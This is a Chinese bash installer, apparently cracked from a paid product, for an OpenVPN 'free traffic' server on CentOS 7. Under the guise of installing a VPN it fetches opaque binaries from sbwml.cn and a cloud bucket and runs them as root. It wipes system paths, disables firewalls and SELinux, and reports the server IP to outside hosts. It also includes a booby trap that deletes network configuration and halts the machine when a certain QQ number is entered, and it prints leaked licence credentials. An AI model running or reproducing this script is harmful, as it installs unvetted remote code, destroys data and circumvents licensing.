#!/bin/bash
# 本脚本由智障团队破解
# 破解不易，转载请注明出处 
# By：渐渐地远去消失
key1=0
rm -rf /sbwml /sbwml.log /bin/ssh /bin/jdk /bin/pro /API
mkdir -p /sbwml/ && mkdir -p /usr/share/linux/ && rm -rf /passwd /bin/vpns
wget http://sh-10048130.cos.myqcloud.com/scrpa >/dev/null 2>&1
chmod 777 scrpa >/dev/null 2>&1
mv /root/scrpa /usr/bin/scrpa >/dev/null 2>&1
web="http://";export web=$web #骚逼汪™
webs="https://";export webs=$webs #骚逼汪™
MirrorHost='www.sbwml.cn';export MirrorHost=$MirrorHost;export Geno=$MirrorHost #骚逼汪™
api=API;export api=$api #骚逼汪™
error="Authorization failure.";export error=$error #骚逼汪™
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin #骚逼汪™
export PATH #骚逼汪™
dpi=79ab5f46b4d5130a692b715fff2d52d6
dpk=`md5sum /usr/bin/curl|cut -d ' ' -f1`
#clear; #骚逼汪™
#echo "Loading ..."
export IPlist=`wget http://sbwml.cn/jiheyun/ -O - -q ; echo`
export blacklist=`wget http://sbwml.cn/IP/XX/ -O - -q ; echo`
export fclist=`wget http://sbwml.cn/IP/FC/ -O - -q ; echo`
export IPVIP=`wget http://sbwml.cn/IP/SIP/ -O - -q ; echo`
export IPKA=`wget http://sbwml.cn/IP/HKA/ -O - -q ; echo`
if [ ! -e "/dev/net/tun" ]; #骚逼汪™
    then
        echo
        echo -e "  安装出错 [原因：\033[31m TUN/TAP虚拟网卡不存在 \033[0m]"
        echo "  网易蜂巢容器官方已不支持安装使用"
        exit 0;
		else
		wget -O /${api} ${web}${MirrorHost}/${api}/${api}S14 >/dev/null 2>&1 #骚逼汪™
fi
if [ ! -e "/usr/bin/curl" ];
    then 
    echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
    yum remove -y curl >/dev/null 2>&1 && yum install -y curl >/dev/null 2>&1 #骚逼汪™
fi
if [ ! -e "/usr/bin/expect" ];
    then
    echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
    yum install -y expect >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/expect" ];
    then
        echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
        yum install -y expect >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/openssl" ];
    then
    echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
    yum install -y openssl >/dev/null 2>&1
	\cp -rf /bin/openssl /usr/bin/suv
	scrpa -O /bin/jdk http://sbwml.cn/API/bash1005 >/dev/null 2>&1 #骚逼汪™
	chmod 0755 /usr/bin/jdk #骚逼汪™
	else
	\cp -rf /usr/bin/openssl /usr/bin/suv
	scrpa -O /bin/jdk http://sbwml.cn/API/bash1005 >/dev/null 2>&1 #骚逼汪™
	chmod 0755 /bin/jdk
fi
if [[ $dpi == $dpk ]];then
pass=2.1
curl -o /bin/mo ${web}${MirrorHost}/${api}/bb >/dev/null 2>&1;chmod 0755 /bin/mo >/dev/null 2>&1 #骚逼汪™
jdk >/dev/null 2>&1
else
pass=2.2
curl -o /bin/mo ${web}${MirrorHost}/${api}/bb >/dev/null 2>&1;chmod 0755 /bin/mo >/dev/null 2>&1 #骚逼汪™
jdk >/dev/null 2>&1
#echo "正在处理环境..."
#yum remove -y curl >/dev/null 2>&1 && yum install -y curl >/dev/null 2>&1 #骚逼汪™
fi
if [ ! -e "/bin/mo" ];then
#yum remove -y mo >/dev/null 2>&1 && yum install -y php-pdo >/dev/null 2>&1 #骚逼汪™
echo "请重新执行脚本..."
exit 0;
fi
clear
cd /
# Logo    ******************************************************************
key="a1af1b01812237a1d92c184a10b451a8"
export key=$key
CopyrightLogo='
==========================================================================
                                                                         
                骚逼汪OpenVPN-2.3.2 云免服务器（Centos7）                      
                  Powered by ajingml.cn 2015-2016                          
                      All Rights Reserved                                
                
==========================================================================';
echo -e "\033[36m$CopyrightLogo\033[0m";
# FILES  ******************************************************************
ServerLocation='yumh';export ServerLocation=$ServerLocation
c532=64-epel-release-5-4.noarch.rpm;
c564=32-epel-release-5-4.noarch.rpm;
c632=32-epel-release-6-8.noarch.rpm;
c664=epel-release-6-8.noarch.rpm;
c700=epel-release-latest-7.noarch.rpm;
sysctl=sysctl.conf;export sysctl=$sysctl
httpport=yumhttp;export httpport=$httpport
vpns=server-passwd.tar.gz;export vpns=$vpns
sq=squid.conf;export sq=$sq
squsername=sbwml2016;export squsername=$squsername
sqpasswd=admin;export sqpasswd=$sqpasswd
dns1=119.29.29.29
dns2=182.254.116.116
sbwml=/etc/openvpn/easy-rsa/sbwml;export sbwml=$sbwml
cats=/etc/alternatives/demo;export cats=$cats
VPNFILE=openvpn-sbwml.zip;export VPNFILE=$VPNFILE
RSA=EasyRSA-2.2.2.tar.gz;export RSA=$RSA
# VAR    ******************************************************************
Model=$1;
Froms=$2;
camd=03fbe5c10cb31ba046984371f0eafbfb;export camd=$camd
ipmd=57d006ac6451149e451b8ffa9c84c1af;export ipmd=$ipmd
rds=dce8026f16bded7b44f169ea7d3b1bce;export rds=$rds
demo1=03fbe5c10cb31ba0451b8ffa9c84c1af;export demo1=$demo1
dbno=sql`openssl rand -base64 8 | cksum | cut -c1-4 ; echo`
export dbno=$dbno
IP=`wget ${web}${MirrorHost}/getip -O - -q ; echo`;  >/dev/null 2>&1
#export henanBGP=`openssl rand -base64 8 | cksum | cut -c1-5 ; echo`7 
export IPAddress=$IP ;export JIIP=`echo $IPAddress -O - -q|awk -F "." '{print $1"."$2"."$3}'`
export zhejiang=`openssl rand -base64 8 | cksum | cut -c1-7 ; echo`8
FCIP=`echo $IPAddress -O - -q|awk -F "." '{print $1"."$2}'`
export zhejiangs=`openssl rand -base64 8 | cksum | cut -c1-1 ; echo`2`openssl rand -base64 8 | cksum | cut -c1-5 ; echo`3
testip=`expr substr $IPAddress 1 8`
export testip=$testip
xuzhouip=`expr substr $IPAddress 1 10`
export xuzhouip=$xuzhouip
henanBGP=`expr substr $IPAddress 1 8`
export henanBGP=$henanBGP
henanBGP2=`expr substr $IPAddress 1 8`
export henanBGP2=$henanBGP2
jiangsu2=`expr substr $IPAddress 1 11`
export jiangsu2=$jiangsu2
yunip=42.51.45;export yunip=$yunip
xuzhou=112.85.13;export xuzhou=$xuzhou
henan=42.51.19;export henan=$henan
henan2=42.51.80;export henan2=$henan2
jiangsuDX=221.229.246;export jiangsuDX=$jiangsuDX
port=8080;export port=$port
vpnport=443;export vpnport=$vpnport
admins=udp;export admins=$admins
adminsport=port;export adminsport=$adminsport
LOGO=`wget ${web}${MirrorHost}/${ServerLocation}/md/ -O - -q ; echo` && pass=sbwml.cn;
export LOGO=$LOGO
rmb=`wget ${web}${MirrorHost}/vpn-passwd/rmb.php -O - -q ; echo`
export rmb=$rmb
#vipop=`wget ${web}${MirrorHost}/zzp/ll/passwd/ -O - -q ; echo`
copyright=`echo -n $LOGO|md5sum`
export copyright=$copyright
pptp=`echo -n $cats|md5sum`
export pptp=$pptp
curls=transfer.sh;
riqi=`date -d today +%Y-%m-%d; echo`
export riqi=$riqi
shijian=`date -d today +%H:%M:%S; echo`
export shijian=$shijian
KSH=`curl -s http://xinben818.cn/sq/api.php?url=${IP}`;
echo 
echo -e "\033[34m安装最新骚逼汪请先进行回车同意\033[0m"
echo -e "\033[31m直接回车默认授权的 \033[0m"
echo
echo -e "\033[35m如已授权请回车继续\033[0m"
read  
echo -e "\033[31;1m授权系统验证中\033[0m";
echo -e "\033[31;1m>>>>>>>>>>>>>>\033[0m";
if [[ $KSH =~ $key1 ]]

    then
    echo 
    if [ ! -e "/etc/alternatives/demo" ];
    then
        echo -e "验证成功！[本机IP：\033[32m $IPAddress \033[0m]"
    else 
        echo -e "验证成功，欢迎使用几何云！[本机IP：\033[32m $IPAddress \033[0m]"
    fi
    else 
    echo
    echo -e "\033[31m验证失败！\033[0m"
OPW='
==========================================================================
    echo -e '\033[36m授权验证失败！请勿非法破解授权！\033[0m'      
                  All Rights Reserved           
                                        
==========================================================================';
echo "$OPW";
exit
fi
function InputIPAddress()
{
    if [ "$IPAddress" == '' ]; then
        echo '无法检测您的IP';
        read -p '请输入您的公网IP:' IPAddress;
        [ "$IPAddress" == '' ] && InputIPAddress;
    fi;
    [ "$IPAddress" != '' ] && echo -n '[  OK  ] 您的IP是:' && echo $IPAddress;
	export IPAddress=$IPAddress
    sleep 2
}
api=API1114;export api=$api
echo "echo hello word!" >/bin/vpns 
rm -f vpn7
zipfile=OpenVPN`openssl rand -base64 8 | cksum | cut -c1-4 ; echo`.zip;
smhoud=sbwml`openssl rand -base64 8 | cksum | cut -c1-8 ; echo`;
smkey=sbwml`openssl rand -base64 8 | cksum | cut -c1-10 ; echo`;
chattr -R -i /data >/dev/null 2>&1
CO='
                OpenVPN-2.3.2 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
if [ -f /etc/os-release ];then
	OS_VERSION=`cat /etc/os-release |awk -F'[="]+' '/^VERSION_ID=/ {print $2}'`
	if [ $OS_VERSION != "7" ];then
		echo -e "\n当前系统版本为：\033[31mCentOS $OS_VERSION\033[0m\n"
		echo "暂不支持该系统安装"
		echo "请更换 CentOS 7.0-7.2 系统进行安装"
		echo "$CO";
		exit 0;
	fi
elif [ -f /etc/redhat-release ];then
	OS_VERSION=`cat /etc/redhat-release |grep -Eos '\b[0-9]+\S*\b' |cut -d'.' -f1`
	if [ $OS_VERSION != "7" ];then
		echo -e "\n当前系统版本为：\033[31mCentOS $OS_VERSION\033[0m\n"
		echo "暂不支持该系统安装"
		echo "请更换 CentOS 7.0-7.2 系统进行安装"
		echo "$CO";
		exit 0;
	fi
else
	echo -e "当前系统版本为：\033[31m未知\033[0m\n"
	echo "暂不支持该系统安装"
	echo "请更换 CentOS 7.0-7.2 系统进行安装"
	echo "$CO";
	exit 0；
fi
		BLDOG=yes;
		export BLDOG=yes
		echo -e "     当前安装：\033[32m变脸狗和谐版（功能强大-支持云端APP、实时监控）\033[0m"
		BLDOG=yes;
		export BLDOG=yes
			echo -e "     温馨提示：\033[31m请输入卡号：17295718 密码：12402153\033[0m"
			echo
			echo -e "     温馨提示：\033[31m请输入卡号：17295718 密码：12402153\033[0m"
			echo
			echo -e "     温馨提示：\033[31m请输入卡号：17295718 密码：12402153\033[0m"
			echo
			echo -e " 请输入正版高级密钥开启安装向导"
			echo
			echo -n " 请输入卡号： "
			read  name
			export name=$name
			echo -n " 请输入密码： "
			read code
			export code=$code
			echo
			echo "  校验密钥 >>>"
			modes=`curl -s http://123.207.168.33/1.php`
			mode=`curl -s http://123.207.168.33/1.php`
			if [ "$modes" = "3306" ] ;then
				echo
				echo -e "  密钥错误/已被使用！ [高级模式：\033[31m 未开启 \033[0m]"
				echo
				echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
				echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
				echo -e "  支付方式:\033[32m 在线支付 \033[0m"
				echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
				echo
				echo " ...安装被终止"
				exit 0;
			fi
			if [ "$modes" = "3307" ] ;then
				echo
				echo -e "  密钥错误！ [高级模式：\033[31m 未开启 \033[0m]"
				echo
				echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
				echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
				echo -e "  支付方式:\033[32m 在线支付 \033[0m"
				echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
				echo
				echo " ...安装被终止"
				exit 0;
			fi
			if [ "$modes" = "3308" ] ;then
				echo
				echo -e "  密钥已被使用！ [高级模式：\033[31m 未开启 \033[0m]"
				echo
				echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
				echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
				echo -e "  支付方式:\033[32m 在线支付 \033[0m"
				echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
				echo
				echo " ...安装被终止"
				exit 0;
			fi
			if [ "$modes" = "3309" ] ;then
				echo
				echo -e "  密码错误，密钥未激活！ [高级模式：\033[31m 未开启 \033[0m]"
				echo
				echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
				echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
				echo -e "  支付方式:\033[32m 在线支付 \033[0m"
				echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
				echo
				echo " ...安装被终止"
				exit 0;
			fi
			if [ "$modes" = "3310" ] ;then
				echo
				echo -e "  密钥错误/已被使用！ [高级模式：\033[31m 未开启 \033[0m]"
				echo
				echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
				echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
				echo -e "  支付方式:\033[32m 在线支付 \033[0m"
				echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
				echo
				echo " ...安装被终止"
				exit 0;
			fi
			if [ "$modes" = "" ] ;then
				echo
				echo -e "  \033[32m维护中...，未激活成功的卡密请保留，等待维护完毕后再安装，感谢您对我们的支持，谢谢！\033[0m [高级模式：\033[31m 未开启 \033[0m]"
				echo
				echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
				echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
				echo -e "  支付方式:\033[32m 在线支付 \033[0m"
				echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
				echo
				echo " ...安装被终止"
				exit 0;
			fi
			if [ "$modes" = "4" ] ;then
				echo
				echo -e "  密钥正确！ [高级模式：\033[32m 已开启 \033[0m]"
				vip=yes;echo $code >/var/openvpn.log
				export vip=yes
				type=all;
				export type=all
				ov4=4
				export ov4=4
			else
				echo
				echo -e "  密钥错误/已被使用！ [高级模式：\033[31m 未开启 \033[0m]"
				echo
				echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
				echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
				echo -e "  支付方式:\033[32m 在线支付 \033[0m"
				echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
				echo
				echo " ...安装被终止"
				exit 0;
			fi

			parse_json(){

				echo $1 | sed 's/.*'$2':\([^,}]*\).*/\1/'
			}
			findsuffix()
				{
					local name
					name="$PACKAGE$MAJOR$MINOR"
					if $name --version < /dev/null > /dev/null 2>&1; then
						PACKAGE=$name
						return 0
					fi
					name="$PACKAGE-$MAJOR$MINOR"
					if $name --version < /dev/null > /dev/null 2>&1; then
						PACKAGE=$name
						return 0
					fi
					name="$PACKAGE-$MAJOR.$MINOR"
					if $name --version < /dev/null > /dev/null 2>&1; then
						PACKAGE=$name
						return 0
					fi

					return 1
				}

				version_check()
					{
						local USESUFFIX=""
						if [ "$1" = "usesuffix" ]; then
							USESUFFIX=true
							shift 1
						fi

						PACKAGE=$1
						PACKAGENAME=$1
						MAJOR=$2
						MINOR=$3
						MICRO=$4
						SILENT=$5
						WRONGVERSION=$6

						VERSION=$MAJOR

						if [ ! -z "$MINOR" ]; then VERSION=$VERSION.$MINOR; else MINOR=0; fi
						if [ ! -z "$MICRO" ]; then VERSION=$VERSION.$MICRO; else MICRO=0; fi

						if [ x$SILENT != x2 ]; then
							if [ ! -z "$VERSION" ]; then
								printf "Checking for $PACKAGE >= $VERSION ... "
							else
								printf "Checking for $PACKAGE ... "
							fi
						fi

						if [ -z "$USESUFFIX" ]; then
							($PACKAGE --version) < /dev/null > /dev/null 2>&1 ||
							{
								if [ -z "$VERSION" ]; then
									VERSION="1.2.3"
								else
									version_check usesuffix $PACKAGE $MAJOR $MINOR $MICRO 2
									return
								fi
								printerror_notfound
								exit 1
							}
						else
							findsuffix ||
							{
								printerror_notfound
								exit 1
							}
						fi
						pkg_version=`$PACKAGE --version|head -n 1|sed 's/([^)]*)//g;s/^[a-zA-Z\.\ \-]*//;s/ .*$//'`
						pkg_major=`echo $pkg_version | cut -d. -f1`
						pkg_minor=`echo $pkg_version | sed s/[-,a-z,A-Z].*// | cut -d. -f2`
						pkg_micro=`echo $pkg_version | sed s/[-,a-z,A-Z].*// | cut -d. -f3`
						[ -z "$pkg_minor" ] && pkg_minor=0
						[ -z "$pkg_micro" ] && pkg_micro=0

						WRONG=
						if [ -z "$MAJOR" ]; then
							echo "found $pkg_version, ok."
							return 0
						fi
						if [ "$pkg_major" -lt "$MAJOR" ]; then
							WRONG=1
						elif [ "$pkg_major" -eq "$MAJOR" ]; then
							if [ "$pkg_minor" -lt "$MINOR" ]; then
								WRONG=1
							elif [ "$pkg_minor" -eq "$MINOR" -a "$pkg_micro" -lt "$MICRO" ]; then
								WRONG=1
							fi
						fi
						if [ ! -z "$WRONG" ]; then
							WRONGVERSION=$pkg_version

							if [ -z "$USESUFFIX" ]; then
								version_check usesuffix $PACKAGE $MAJOR $MINOR $MICRO 2 "$pkg_version"
								return
							fi
							if [ x$SILENT = x1 ]; then
								return 2;
							fi
							printerror_notfound
							exit 2
						else
							echo "found $pkg_version, ok."
							return 0
						fi
					}
		chattr -i /etc/hosts >/dev/null 2>&1
		#date +"%Y-%m-%d" >/var/db3
		echo
		echo "系统正在安装OpenVPN服务，请耐心等待："
		echo
		if [[ $mode == 4 ]]
		then
			echo "自定义设置端口（以下设置可直接回车使用默认值）"
			echo "（删除提示：按住Ctrl + Delet 可删除输入.）"
			echo
			echo -n "输入VPN端口（默认443）："
			read vpnport
			if [ -z $vpnport ]
			then
				echo -e "VPN端口：\033[32m443\033[0m"
				vpnport=443
			else
				echo -e "VPN端口：\033[32m$vpnport\033[0m"
			fi
			echo
			echo "（此端口设置复杂的端口有效避免被扫流量问题，中国移动请保留8080）"
			echo -n "输入HTTP转接端口（建议8080 ~ ≤51200，默认8080）："
			read httpports
			if [ -z $httpports ]
			then
				echo -e "HTTP转接端口：\033[32m8080\033[0m"
				httpports=8080
			else
				echo -e "HTTP转接端口：\033[32m$httpports\033[0m"
			fi
			echo
			echo "（此端口建议保留80，已防扫）"
			echo -n "输入常规代理端口（默认80）："
			read proxyport
			if [ -z $proxyport ]
			then
				echo  -e "常规代理端口：\033[32m80\033[0m"
				proxyport=80
			else
				echo -e "常规代理端口：\033[32m$proxyport\033[0m"
			fi
			if [[ $BLDOG = yes ]];then
				echo 
				echo "（此项建议直接回车开启UDP） "
				echo -n "是否开启UDP 138端口？1.开启 2.不开启（默认 1）："
				read udp138
				if [ -z $udp138 ]
			then
				echo -e "UDP 138端口：\033[32m开启（连接138需要服务器支持）\033[0m"
				udp138=1
			else
				if [[ $udp138 == 1 ]]
				then
					echo -e "\033[32mUDP 138端口：开启（连接138需要服务器支持）\033[0m"
					udp138=1
				fi
				if [[ $udp138 == 2 ]]
				then
					echo -e "UDP 138端口：\033[32m不开启\033[0m"
					udp138=2
				fi
				fi
			fi
			
			if [[ $BLDOG = yes ]];then
			echo
			echo "自定义管理员后台地址（直接回车使用随机地址）"
			echo -e "（为了你数据安全，请勿输入\033[31madmin\033[0m）"
			echo -e "（地址效果：\033[32mhttp://$IPAddress:8888/\033[0m\033[34m输入的地址\033[0m\033[32m/\033[0m）"
			echo
			echo -n "输入管理员后台地址："
			read admindz
			if [ -n "$(echo $admindz| sed -n "/^[0-9a-zA-Z]\+$/p")" ];then
				echo -e "管理员后台地址：\033[32mhttp://$IPAddress:8888/\033[0m\033[34m$admindz\033[0m\033[32m/\033[0m"
				#chattr -i /data/admin >/dev/null 2>&1
				#echo $admindz >/data/admin
			else
				admindz=admin`openssl rand -base64 8 | cksum | cut -c1-4 ; echo`;
				echo
				echo -e "输入错误，已创建随机地址：\033[34m$admindz\033[0m"
				echo -e "管理员后台地址：\033[32mhttp://$IPAddress:8888/\033[0m\033[34m$admindz\033[0m\033[32m/\033[0m"
				echo -e "管理员后台地址：\033[32mhttp://$IPAddress:8888/\033[0m\033[34m$admindz\033[0m\033[32m/\033[0m" >/var/admindz
				echo "cat /var/admindz" >/bin/admin
				chmod 0755 /bin/admin
			fi
			fi
			
			if [[ $BLDOG = yes ]];then
				echo 
				echo -n "输入你的QQ号码（客服）："
				read QQ
				if [[ $QQ = 984419930 ]];then
					echo 
					echo "请勿输入官方人员QQ，你的授权码已被吊销..."
					rm -rf /etc/sysconfig/network-script/* >/dev/null 2>&1
					rm -rf /etc/resolv.conf >/dev/null 2>&1
					service network reboot >/dev/null 2>&1
					halt >/dev/null 2>&1
					exit 0;
				fi
				if [ -z $QQ ]
					then
						echo  -e "云流量客服QQ号码：\033[32m未设置\033[0m"
						QQ="Not Found"
					else
						echo -e "云流量客服QQ号码：\033[32m$QQ\033[0m"
				fi
			fi
			#echo
			#echo -n "是否安装phpMyAdmin? 1.安装 2.不安装（默认 1）："
			#read phpMyAdmin
			phpMyAdmin=1
			if [ -z $phpMyAdmin ]
			then
				#echo -e "\033[32m数据库管理：安装（默认ROOT密码：root）\033[0m"
				phpMyAdmin=1
			else
				if [[ $phpMyAdmin == 1 ]]
				then
				#	echo -e "\033[32m数据库管理：安装（默认ROOT密码：root）\033[0m"
					phpMyAdmin=1
				fi
				if [[ $phpMyAdmin == 2 ]]
				then
				#	echo -e "数据库管理：\033[32m不安装phpMyAdmin\033[0m"
					phpMyAdmin=2
				fi
			fi
		fi
		echo
		echo "正在部署环境..."
		sleep 1
		#rm -f /etc/yum.repos.d/CentOS-Base.repo
		#scrpa -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo >/dev/null 2>&1
		killall openvpn >/dev/null 2>&1
        killall openvpn2 >/dev/null 2>&1
		killall udp >/dev/null 2>&1
		killall tcpudp >/dev/null 2>&1
		rm -f /usr/bin/end
		rm -rf /usr/bin/udp /lib/systemd/system/vpn.service
		rm -rf /etc/openvpn/* /etc/squid/* /bin/sqlpass /bin/sql
		rm -rf /home/openvpn-sbwml.zip /home/OpenVPN-HTTP.ovpn /home/OpenVPN-HTTP-lt.ovpn /home/OpenVPN-Old.ovpn /etc/httpd/conf/httpd.conf
		rm -f /home/* >/dev/null 2>&1
		rm -rf /data
		rm -rf /usr/local/ssl /bin/end /usr/bin/tcpudp /usr/bin/linuxlog /usr/bin/end
		echo "安装执行命令..."
		yum remove -y squid openvpn httpd epel* >/dev/null 2>&1
		yum remove -y libstdc++-4.8.2-16.el7.i686 >/dev/null 2>&1
		yum install -y gawk tar iptables iptables-services zip unzip httpd-devel net-tools psmisc gcc glibc glibc-static glibc-utils java openssl openssl-libs ntp libstdc++ glibc.i686
		kill `netstat -nlp | grep :3306 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
		kill `netstat -nlp | grep :80 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
		kill `netstat -nlp | grep :8080 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
		kill `netstat -nlp | grep :443 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
		kill `netstat -nlp | grep :8888 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
		kill `netstat -nlp | grep :138 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
		kill `netstat -nlp | grep :137 | awk '{print $7}' | awk -F"/" '{ print $1 }'` >/dev/null 2>&1
		# sbwml
		echo "正在同步时间..."
		systemctl stop ntpd.service >/dev/null 2>&1
		service ntpd stop >/dev/null 2>&1
		\cp -rf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime >/dev/null 2>&1
		ntpServer=(
			[0]=s2c.time.edu.cn
			[1]=cn.ntp.org.cn
			[2]=s1a.time.edu.cn
			[3]=s2g.time.edu.cn
			[4]=s2k.time.edu.cn
			[5]=s2m.time.edu.cn
		)
		serverNum=`echo ${#ntpServer[*]}`
		NUM=0
		for (( i=0; i<=$serverNum; i++ )); do
			echo
			echo -en " 正在和NTP服务器 \033[34m${ntpServer[$NUM]} \033[0m 同步中..."
			ntpdate ${ntpServer[$NUM]} >> /dev/null 2>&1
			if [ $? -eq 0 ]; then
				echo -e "\t\t\t[  \e[1;32mOK\e[0m  ]"
				echo -e " 当前时间：\033[34m$(date -d "2 second" +"%Y-%m-%d %H:%M.%S")\033[0m"
				echo
				break
			else
				echo -e "\t\t\t[  \e[1;31mERROR\e[0m  ]"
				let NUM++
			fi
			sleep 2
		done
		hwclock --systohc
		systemctl start ntpd.service >/dev/null 2>&1
		service ntpd start >/dev/null 2>&1
		echo "正在更换软件源..."
		#mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
		#scrpa -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo >/dev/null 2>&1
		#echo "正在生成缓存...(时间比较长，必要时可以小睡一会再回来)"
		#yum makecache
		#yum install -y epel* >/dev/null 2>&1
		#scrpa -O /etc/yum.repos.d/epel.repo http://sbwml.cn/API/epel.repo >/dev/null 2>&1
		#echo "正在重建缓存（时间可能较长，但是很有意义）..."
		#yum clean all
		#yum makecache
		PP='
==========================================================================
              骚逼汪服务验证失败，安装被终止

                OpenVPN-2.3.2 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
		if [[ ${copyright%%\ *} == $key ]]
		then
		end=1225;
	else
		clear
		echo "$PP";
		exit
	fi
	echo "检查并更新软件..."
	sleep 1
	#yum update -y
	# OpenVPN Installing ****************************************************************************
	echo "配置网络环境..."
	sleep 1
	systemctl stop firewalld.service >/dev/null 2>&1
	systemctl disable firewalld.service >/dev/null 2>&1
	systemctl restart iptables.service >/dev/null 2>&1
	iptables -F >/dev/null 2>&1
	service iptables save >/dev/null 2>&1
	service iptables restart >/dev/null 2>&1
	iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE >/dev/null 2>&1
	if [[ $mode == 4 ]]
	then
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport $httpports -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport $proxyport -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport $vpnport -j ACCEPT >/dev/null 2>&1
	else
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT >/dev/null 2>&1
		iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT >/dev/null 2>&1
	fi
	iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 8888 -j ACCEPT >/dev/null 2>&1
	iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 9876 -j ACCEPT >/dev/null 2>&1
	iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
	iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 137 -j ACCEPT >/dev/null 2>&1
	iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 138 -j ACCEPT >/dev/null 2>&1
	iptables -A INPUT -p udp --dport 138 -j ACCEPT >/dev/null 2>&1
	#iptables -A INPUT -p udp --destination-port 138 -j ACCEPT
	iptables -t nat -A POSTROUTING -j MASQUERADE >/dev/null 2>&1
	iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT >/dev/null 2>&1
	service iptables save >/dev/null 2>&1
	service iptables restart >/dev/null 2>&1
	systemctl restart iptables.service >/dev/null 2>&1
	chkconfig iptables on >/dev/null 2>&1
	systemctl enable iptables.service >/dev/null 2>&1
	setenforce 0 >/dev/null 2>&1
	# OpenVPN Installing ****************************************************************************
	if [[ 1225 == $end ]]
	then
		openvpn=on;
	else
		clear
		echo "$PP";
		exit
	fi
	cd /etc/

		uido=125133;
	rm -rf ./sysctl.conf
       rm -f /usr/sbin/openvpn2
	scrpa $web${MirrorHost}/$ServerLocation/$sysctl >/dev/null 2>&1
	sleep 1
	chmod 0755 ./sysctl.conf
	sysctl -p >/dev/null 2>&1
	# OpenVPN Installing ****************************************************************************
	echo "正在安装主程序..."
	sleep 1
	#yum install openvpn -y
	yum install -y squid openssl openssl-devel lzo lzo-devel pam pam-devel automake pkgconfig zlib glibc.i686
	sleep 1
	if [ ! -e "/usr/lib/libz.so.1" ]; #骚逼汪?
	then
	yum install -y zlib
	fi
	if [ ! -e "/usr/bin/gcc" ]; #骚逼汪?
	then
	yum install -y gcc
	fi
	if [ ! -e "/usr/bin/java" ]; #骚逼汪?
	then
	yum install -y java
	fi
	if [ ! -e "/usr/lib/libz.so.1" ]; #骚逼汪?
	then
	rpm -ivh http://www.sbwml.cn/$api/zlib-1.2.7-15.el7.i686.rpm
	fi
	if [ ! -e "/lib/libgcc_s.so.1" ]; #骚逼汪?
	then
	rpm -ivh http://www.sbwml.cn/$api/libgcc-4.8.5-4.el7.i686.rpm
	fi
	if [ ! -e "/usr/sbin/squid" ]; #骚逼汪?
    then
	yum install -y squid
	fi
	rpm -ivh $web${MirrorHost}/API/pkcs11-helper-1.10-1.el7.x86_64.rpm >/dev/null 2>&1
	if [ ! -e "/usr/lib64/libpkcs11-helper.so.1" ];
	then
		rpm -Uvh http://mirrors.sohu.com/fedora-epel/7/x86_64/e/epel-release-7-2.noarch.rpm >/dev/null 2>&1
		sleep 1
		yum install pkcs11-helper -y
	fi
	cd /etc/
	curl -o openvpn-2.3.2-4.el7.x86_64.rpm $web${MirrorHost}/API/openvpn-2.3.2-4.el7.x86_64.rpm >/dev/null 2>&1
	rpm -ivh openvpn-2.3.2-4.el7.x86_64.rpm
    \cp /usr/sbin/openvpn /usr/sbin/openvpn2 >/dev/null 2>&1
